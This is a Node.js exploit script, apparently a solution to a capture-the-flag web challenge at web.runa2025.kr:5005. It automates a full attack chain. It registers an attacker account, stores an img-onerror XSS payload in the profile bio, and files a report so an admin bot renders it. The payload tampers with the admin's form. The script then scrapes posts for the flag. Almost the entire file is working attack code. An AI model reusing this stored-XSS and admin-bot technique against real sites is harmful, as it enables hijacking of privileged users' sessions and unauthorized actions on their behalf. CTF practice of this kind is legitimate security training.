const https = require('https');
const http = require('http');
const querystring = require('querystring');
const { URL } = require('url');

const BASE_URL = 'http://web.runa2025.kr:5005';

// Helper function to make HTTP requests
function makeRequest(method, path, data = null, headers = {}) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, BASE_URL);
        const protocol = url.protocol === 'https:' ? https : http;
        
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + url.search,
            method: method,
            headers: {
                'Cookie': headers.cookie || '',
                'User-Agent': 'Mozilla/5.0',
                ...headers
            }
        };

        const req = protocol.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: body
                });
            });
        });

        req.on('error', reject);
        if (data) req.write(data);
        req.end();
    });
}

// Extract cookie from Set-Cookie header
function extractCookie(setCookieHeader) {
    if (Array.isArray(setCookieHeader)) {
        return setCookieHeader
            .map(cookie => cookie.split(';')[0])
            .join('; ');
    }
    return setCookieHeader ? setCookieHeader.split(';')[0] : '';
}

// Extract CSRF token from HTML
function extractCSRFToken(html) {
    const match = html.match(/<input[^>]*name="_csrf"[^>]*value="([^"]+)"/);
    return match ? match[1] : null;
}

// Extract session cookie
function getSessionFromSetCookie(header) {
    if (Array.isArray(header)) {
        for (const cookie of header) {
            if (cookie.includes('connect.sid=')) {
                return cookie.split(';')[0];
            }
        }
    }
    return '';
}

// Merge cookies
function mergeCookies(oldCookie, newCookie) {
    const oldParts = oldCookie.split('; ').filter(c => c && !c.startsWith('connect.sid'));
    const newParts = newCookie.split('; ').filter(c => c);
    return [...oldParts, ...newParts].filter(c => c).join('; ');
}

async function exploit() {
    console.log('[*] Starting U, Our Star exploit on real server...');
    console.log('[*] Target: http://web.runa2025.kr:5005');

    try {
        // 1. Create user account
        console.log('\n[1] Creating attacker account...');
        let res = await makeRequest('GET', '/auth/register');
        let cookie = extractCookie(res.headers['set-cookie']);
        let csrf = extractCSRFToken(res.body);

        console.log('[*] CSRF token: ' + (csrf || 'not found in HTML'));

        const username = 'attacker' + Date.now();
        const payload = {
            username: username,
            password: 'password123',
            age: '25',
            mbti: 'ISTJ',
            sex: 'ë‚¨'
        };
        
        if (csrf) {
            payload._csrf = csrf;
        }

        res = await makeRequest('POST', '/auth/register', 
            querystring.stringify(payload),
            {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookie
            }
        );

        const sessionCookie = getSessionFromSetCookie(res.headers['set-cookie']) || cookie;
        console.log('[+] Account created: ' + username);
        console.log('[+] Session cookie obtained');

        // 2. Update profile with XSS payload
        console.log('\n[2] Updating profile with XSS payload...');
        res = await makeRequest('GET', `/user/profile/${username}`, null, { 'Cookie': sessionCookie });
        csrf = extractCSRFToken(res.body);

        console.log('[*] Profile page CSRF token: ' + (csrf || 'not found'));

        const xssPayload = `<img src=x onerror="
  (async () => {
    try {
      const resp = await fetch('/');
      const html = await resp.text();
      const postMatch = html.match(/\\/post\\/([a-f0-9-]+)/);
      
      if (postMatch && document.getElementById('adminForm')) {
        const postId = postMatch[1];
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'postId';
        input.value = postId;
        document.getElementById('adminForm').appendChild(input);
      }
    } catch(e) {}
  })();
">`;

        const profilePayload = {
            bio: xssPayload,
            theme: ''
        };

        if (csrf) {
            profilePayload._csrf = csrf;
        }

        res = await makeRequest('POST', `/user/profile/${username}`,
            querystring.stringify(profilePayload),
            {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionCookie
            }
        );
        console.log('[+] Profile updated with XSS payload');

        // 3. Submit report to trigger admin visit
        console.log('\n[3] Submitting report to trigger admin visit...');
        res = await makeRequest('GET', '/report', null, { 'Cookie': sessionCookie });
        csrf = extractCSRFToken(res.body);

        console.log('[*] Report page CSRF token: ' + (csrf || 'not found'));

        const reportPayload = {
            username: username
        };

        if (csrf) {
            reportPayload._csrf = csrf;
        }

        res = await makeRequest('POST', '/report',
            querystring.stringify(reportPayload),
            {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionCookie
            }
        );
        console.log('[+] Report submitted - admin will visit your profile');

        // 4. Wait for admin visit
        console.log('\n[4] Waiting 10 seconds for admin bot to visit and execute XSS...');
        for (let i = 0; i < 10; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            process.stdout.write('.');
        }
        console.log('\n');

        // 5. Try to fetch posts
        console.log('[5] Fetching available posts...');
        res = await makeRequest('GET', '/', null, { 'Cookie': sessionCookie });
        
        const flagMatch = res.body.match(/runa2025\{[^}]+\}/);
        if (flagMatch) {
            console.log('[+] FLAG FOUND: ' + flagMatch[0]);
            return flagMatch[0];
        }

        // Try to find post links and fetch them
        const postLinks = res.body.match(/\/post\/[a-f0-9-]+/g) || [];
        console.log('[*] Found ' + postLinks.length + ' posts to check');

        for (const postLink of postLinks) {
            const postId = postLink.split('/')[2];
            res = await makeRequest('GET', `/post/${postId}`, null, { 'Cookie': sessionCookie });
            
            if (res.status === 200) {
                const flagMatch = res.body.match(/runa2025\{[^}]+\}/);
                if (flagMatch) {
                    console.log('[+] FLAG FOUND in post ' + postId + ': ' + flagMatch[0]);
                    return flagMatch[0];
                }
            }
        }

        console.log('[-] Flag not found in posts yet');

    } catch (error) {
        console.error('[!] Error:', error.message);
    }
}

exploit();
